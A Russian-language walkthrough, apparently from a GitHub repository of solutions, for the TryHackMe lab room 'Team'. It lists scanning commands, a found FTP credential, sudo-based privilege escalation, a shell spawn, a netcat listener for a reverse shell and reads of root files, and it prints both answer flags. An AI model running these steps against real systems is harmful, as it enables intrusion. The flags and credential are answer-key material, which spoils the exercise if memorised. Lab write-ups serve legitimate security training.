[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Team](https://tryhackme.com/r/room/teamcw) 

Всего 2 задания:
## Задание 1
Привет всем, это мой первый бокс! Он рассчитан на новичков, так как я часто вижу боксы, которые "легкие", но зачастую немного сложнее!

Пожалуйста, подождите 3–5 минут, пока устройство загрузится.

Редактировать 06/03/21- Просто для ясности, есть несколько способов получить root-права на этой машине. Один из них 
непреднамеренный, но это просто еще одна возможность научиться :) 

Создано:dalemazza

Благодарим P41ntP4rr0t за помощь в пути .
### Ответьте на вопросы ниже
Развернуто
```commandline
Ответ не нужен
```

## Задание 2
Создано: dalemazza

Благодарим P41ntP4rr0t за помощь в пути .

### Ответьте на вопросы ниже
пользователь.txt
```commandline
nmap -sC -sV -A <IP>
curl -s http://<IP>/robots.txt
gobuster dir -u http://<IP> -x php,txt -w /usr/share/wordlists/dirb/common.txt 
gobuster dir -u http://<IP>/scripts/ -x php,txt -w /usr/share/wordlists/dirb/common.txt 
curl -s http://<IP>/scripts/script.txt
curl -s http://<IP>>/scripts/script.old
ftpuser:T3@m$h@r3
ftp <IP>
ls
cd workshare
ls
get New_site.txt -

```
```commandline
THM{6Y0TXHz7c2d}
```
корень.txt
```commandline
sudo -l
cat admin_checks
sudo -u gyles /home/gyles/admin_checks
python3 -c "import pty;pty.spawn('/bin/bash')"
cat /opt/admin_stuff/script.sh 
cat /usr/local/bin/main_backup.sh

nc -nlvp 4444
cat /root/root.txt
```
```commandline
THM{fhqbznavfonq}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)